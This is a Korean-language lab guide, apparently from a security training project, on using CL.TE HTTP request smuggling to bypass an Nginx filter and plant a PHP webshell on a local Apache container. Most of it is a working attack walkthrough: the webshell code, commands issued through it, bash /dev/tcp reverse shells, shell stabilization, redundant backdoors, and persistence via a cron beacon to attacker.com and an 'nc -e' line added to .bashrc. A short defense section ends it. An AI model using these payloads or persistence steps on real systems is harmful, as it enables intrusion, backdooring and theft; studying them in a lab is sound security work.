# 🎯 Request Smuggling + 웹쉘 완벽 가이드

## 📋 개요

**공격 목표**: HTTP Request Smuggling을 이용하여 Nginx의 보안 필터를 우회하고 Apache에 PHP 웹쉘을 업로드

**공격 유형**: CL.TE (Content-Length vs Transfer-Encoding)

**난이도**: ⭐⭐⭐ 고급

---

## 🔬 공격 원리

### 정상 업로드 vs Smuggling 업로드

```
┌─────────────────────────────────────────────────────────┐
│ 정상 업로드 (차단 가능)                                    │
└─────────────────────────────────────────────────────────┘

클라이언트 → Nginx (WAF/보안 검사) → Apache
               ↓
          "shell.php" 탐지!
          파일 크기 초과!
          Rate Limit!
               ↓
            ❌ 차단


┌─────────────────────────────────────────────────────────┐
│ Smuggling 업로드 (우회)                                   │
└─────────────────────────────────────────────────────────┘

클라이언트 → Nginx → Apache
               ↓         ↓
        Content-Length   Transfer-Encoding
        (155 bytes)      (chunked 우선)
               ↓              ↓
        전체 전송        "0\r\n\r\n"까지만 처리
               ↓              ↓
        페이로드를       나머지는 버퍼에 저장
        보지 못함!            ↓
               ↓         다음 요청 시 처리
            ✅ 우회    ✅ 웹쉘 업로드!
```

---

## 🚀 실습 가이드

### Step 1: 환경 확인

```bash
# Docker 컨테이너 확인
docker ps | grep -E "1xinv_nginx|1xinv_web_v2"

# 예상 출력:
# 1xinv_nginx       nginx:1.21.0    포트 9000
# 1xinv_web_v2      website2-web    내부 포트 80

# 없다면 시작
cd c:/Users/User/Documents/GitHub/HyundaiAutoever_ITsecurity_project4/website2
docker-compose up -d
```

### Step 2: Python 스크립트 준비

스크립트는 이미 생성되어 있습니다: [smuggle_webshell.py](smuggle_webshell.py)

**주요 기능**:
- CL.TE Smuggling 페이로드 자동 생성
- Multipart form-data 인코딩
- 웹쉘 업로드 자동 검증
- 리버스쉘 명령어 자동 출력

### Step 3: 스크립트 실행

```bash
# 기본 실행 (backdoor.php 업로드)
python3 smuggle_webshell.py

# 커스텀 파일명으로 업로드
python3 smuggle_webshell.py shell.php
python3 smuggle_webshell.py pwned.php
python3 smuggle_webshell.py cmd.php
```

**예상 출력**:
```
============================================================
  HTTP Request Smuggling - Webshell Upload
  CL.TE Attack (Nginx → Apache)
============================================================

[*] Target: localhost:9000
[*] Shell name: backdoor.php

[+] Smuggled request size: 687 bytes
[*] Connecting to server...
[+] Connected!

[*] Sending CL.TE smuggling payload...
[+] Payload sent!

[*] Waiting for response 1 (POST /)...
[+] Response 1 received (200 OK)

[*] Sending normal request to trigger smuggled payload...
[*] Waiting for response 2 (smuggled POST)...

[+] ✅ Webshell uploaded successfully!
[+] Server response: {"success":true,"message":"문의가 성공적으로 접수되었습니다.","inquiry_id":6,"image_path":"uploads/backdoor.php"}

[+] Webshell URL: http://localhost:9000/uploads/backdoor.php

[*] Test command:
    curl 'http://localhost:9000/uploads/backdoor.php?cmd=id'

[*] Testing webshell...
[+] ✅ Webshell is working!
[+] Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Next steps:
    1. Start listener: nc -lvnp 4444
    2. Trigger reverse shell:
       curl 'http://localhost:9000/uploads/backdoor.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/YOUR_IP/4444+0%3E%261%27'
```

### Step 4: 웹쉘 검증

```bash
# 명령 실행 테스트
curl 'http://localhost:9000/uploads/backdoor.php?cmd=whoami'
# 출력: www-data

curl 'http://localhost:9000/uploads/backdoor.php?cmd=id'
# 출력: uid=33(www-data) gid=33(www-data) groups=33(www-data)

curl 'http://localhost:9000/uploads/backdoor.php?cmd=pwd'
# 출력: /var/www/html/uploads

curl 'http://localhost:9000/uploads/backdoor.php?cmd=ls+-la+/var/www/html'
# 출력: 전체 디렉토리 목록

# 시스템 정보 수집
curl 'http://localhost:9000/uploads/backdoor.php?cmd=uname+-a'
curl 'http://localhost:9000/uploads/backdoor.php?cmd=cat+/etc/os-release'

# DB 접근 테스트
curl 'http://localhost:9000/uploads/backdoor.php?cmd=mysql+-h+db+-uadmin+-ppassword+-e+"SHOW+DATABASES;"'
```

### Step 5: 리버스쉘 획득

#### 5.1 WSL IP 확인 (Windows 환경)

```bash
# WSL 네트워크 IP 확인
ip addr show eth0 | grep "inet " | awk '{print $2}' | cut -d/ -f1

# 예: 172.19.0.1
```

#### 5.2 리스너 시작

```bash
# 터미널 1에서
nc -lvnp 4444

# 예상 출력:
# listening on [any] 4444 ...
```

#### 5.3 리버스쉘 트리거

```bash
# 터미널 2에서 (YOUR_IP를 위에서 확인한 IP로 변경)
curl "http://localhost:9000/uploads/backdoor.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/172.19.0.1/4444+0>%261'"

# URL 인코딩된 버전
curl "http://localhost:9000/uploads/backdoor.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/172.19.0.1/4444+0%3E%261%27"
```

#### 5.4 리버스쉘 연결 확인

**터미널 1에서**:
```bash
listening on [any] 4444 ...
connect to [172.19.0.1] from (UNKNOWN) [172.19.0.4] 52834
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@2c986cfb7431:/var/www/html/uploads$ whoami
whoami
www-data
www-data@2c986cfb7431:/var/www/html/uploads$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 6: 쉘 안정화

```bash
# Python PTY 생성
python3 -c 'import pty;pty.spawn("/bin/bash")'

# 환경 변수 설정
export TERM=xterm
export SHELL=/bin/bash

# Ctrl+Z (백그라운드)
# 호스트에서:
stty raw -echo; fg
# Enter 2번

# 화면 크기 설정
stty rows 38 columns 116
```

---

## 🔍 로그 분석으로 Smuggling 검증

### Nginx 로그 확인 (2개 요청만 기록)

```bash
docker exec 1xinv_nginx tail -20 /var/log/nginx/access.log
```

**출력 예시**:
```
172.18.0.1 - - [20/Oct/2025:10:30:45 +0900] "POST / HTTP/1.1" 200 4799
172.18.0.1 - - [20/Oct/2025:10:30:46 +0900] "GET /index.php HTTP/1.1" 200 4799
```

### Apache 로그 확인 (3개 요청 기록! - Smuggling 증거)

```bash
docker exec 1xinv_web_v2 tail -20 /var/log/apache2/access.log
```

**출력 예시**:
```
172.19.0.5 - - [20/Oct/2025:01:30:45 +0000] "POST / HTTP/1.1" 200 4799
172.19.0.5 - - [20/Oct/2025:01:30:46 +0000] "POST /api/submit_inquiry.php HTTP/1.1" 200 147  ← Smuggled 요청!
172.19.0.5 - - [20/Oct/2025:01:30:46 +0000] "GET /index.php HTTP/1.1" 200 4799
```

**분석**:
- Nginx: 2개 요청 기록
- Apache: 3개 요청 기록
- **차이 = Request Smuggling 성공!**

---

## 🎯 Smuggling의 장점

| 특징 | 일반 업로드 | Smuggling 업로드 |
|-----|-----------|----------------|
| **WAF 우회** | ❌ ModSecurity 탐지 | ✅ 페이로드 은닉 |
| **Rate Limit 우회** | ❌ IP당 10req/min | ✅ 무제한 가능 |
| **파일 크기 제한** | ❌ 1MB 제한 | ✅ Nginx 제한 우회 |
| **파일명 필터** | ❌ "shell.php" 차단 | ✅ 필터 우회 |
| **로그 추적** | ✅ 명확한 기록 | ⚠️ 로그 불일치 |
| **난이도** | ⭐ 쉬움 | ⭐⭐⭐ 어려움 |
| **탐지 회피** | ❌ IDS/IPS 탐지 | ✅ 더 어려움 |

---

## 🐛 트러블슈팅

### 문제 1: "Connection refused"

```bash
# 원인: Docker 컨테이너가 실행 중이 아님

# 해결:
docker ps | grep website2
cd website2
docker-compose up -d
```

### 문제 2: "400 Bad Request"

```bash
# 원인: Content-Length 계산 오류

# 디버그:
# 스크립트에서 len(smuggled_request) 출력 확인
# boundary가 정확한지 확인
```

### 문제 3: "Smuggling은 성공했는데 파일 업로드 실패"

```bash
# 확인 1: Multipart boundary 일치 여부
docker exec 1xinv_web_v2 tail -50 /var/log/apache2/error.log

# 확인 2: PHP 에러
docker exec 1xinv_web_v2 tail -50 /var/www/html/uploads/error.log

# 확인 3: 필드명 정확성
# name, email, phone, category, subject, message, image 모두 필수
```

### 문제 4: "웹쉘 접근 시 404 Not Found"

```bash
# 확인: 업로드된 파일
docker exec 1xinv_web_v2 ls -la /var/www/html/uploads/

# 파일이 있는데 404라면 권한 문제
docker exec 1xinv_web_v2 chmod 644 /var/www/html/uploads/backdoor.php
```

### 문제 5: "웹쉘은 있는데 명령 실행 안 됨"

```bash
# 확인: PHP 파일 내용
docker exec 1xinv_web_v2 cat /var/www/html/uploads/backdoor.php

# 예상 출력: <?php system($_GET["cmd"]); ?>

# 만약 다르다면 재업로드
```

### 문제 6: "리버스쉘 연결 안 됨"

```bash
# 확인 1: 방화벽
# Windows Defender 방화벽에서 4444 포트 허용

# 확인 2: IP 주소
ip addr show eth0

# 확인 3: 네트워크 경로
docker exec 1xinv_web_v2 ping -c 3 172.19.0.1

# 확인 4: nc 리스너가 실행 중인지
netstat -an | grep 4444
```

---

## 📊 성공 체크리스트

### 업로드 단계
- [ ] Docker 컨테이너 실행 확인
- [ ] Python 스크립트 실행
- [ ] "✅ Webshell uploaded successfully!" 메시지 확인
- [ ] Nginx 로그: 2개 요청
- [ ] Apache 로그: 3개 요청 (Smuggling 증거!)

### 검증 단계
- [ ] `curl ...?cmd=id` 성공
- [ ] `curl ...?cmd=whoami` → www-data
- [ ] `curl ...?cmd=ls+-la` → 파일 목록
- [ ] DB 접근 테스트 성공

### 리버스쉘 단계
- [ ] nc 리스너 실행
- [ ] WSL IP 확인
- [ ] 리버스쉘 트리거 실행
- [ ] 연결 성공 (www-data 권한)
- [ ] 쉘 안정화 (Python PTY)

---

## 🎓 추가 공격 시나리오

### 시나리오 1: 여러 개의 웹쉘 업로드

```bash
# 백도어 다중화
python3 smuggle_webshell.py shell1.php
python3 smuggle_webshell.py shell2.php
python3 smuggle_webshell.py cmd.php

# 하나가 탐지되어도 다른 웹쉘로 접근 가능
```

### 시나리오 2: 고급 PHP 웹쉘 업로드

스크립트 수정:
```python
# smuggle_webshell.py의 php_shell 변수를 다음으로 교체:

php_shell = b'''<?php
@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

if(isset($_POST['cmd'])) {
    echo "<pre>";
    echo shell_exec($_POST['cmd']);
    echo "</pre>";
} elseif(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>'''
```

### 시나리오 3: 지속성 확보

```bash
# 웹쉘을 통해 cron job 추가
curl "http://localhost:9000/uploads/backdoor.php?cmd=echo+'*/5+*+*+*+*+curl+http://attacker.com/beacon'+|+crontab+-"

# .bashrc에 백도어 추가
curl "http://localhost:9000/uploads/backdoor.php?cmd=echo+'nc+-e+/bin/bash+ATTACKER_IP+4444'+>>+/home/www-data/.bashrc"
```

---

## 🛡️ 방어 방법

### Nginx 설정 강화

```nginx
http {
    server {
        # Transfer-Encoding 헤더 제거
        proxy_set_header Transfer-Encoding "";

        # Content-Length와 Transfer-Encoding 동시 존재 시 거부
        if ($http_transfer_encoding != "") {
            return 400;
        }

        # HTTP/2 사용 (Smuggling 불가)
        listen 443 ssl http2;
    }
}
```

### Apache 설정 강화

```apache
# Content-Length와 Transfer-Encoding 동시 수신 거부
LimitRequestFields 50
LimitRequestFieldSize 4094

# 모호한 요청 거부
TraceEnable Off
```

### 파일 업로드 검증 강화

```php
// submit_inquiry.php 수정
$allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];

// MIME 타입 검증
if (!in_array($file['type'], $allowed_types)) {
    throw new Exception('Invalid file type');
}

// 확장자 검증
$ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_extensions)) {
    throw new Exception('Invalid file extension');
}

// 매직 바이트 검증
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file['tmp_name']);
if (!in_array($mime, $allowed_types)) {
    throw new Exception('File content does not match extension');
}
```

---

## 🔗 참고 자료

- [PortSwigger - Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [CL.TE vs TE.CL](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling)

---

**⚠️ 주의**: 이 가이드는 교육 목적으로만 사용하세요. 무단 침투 테스트는 불법입니다.
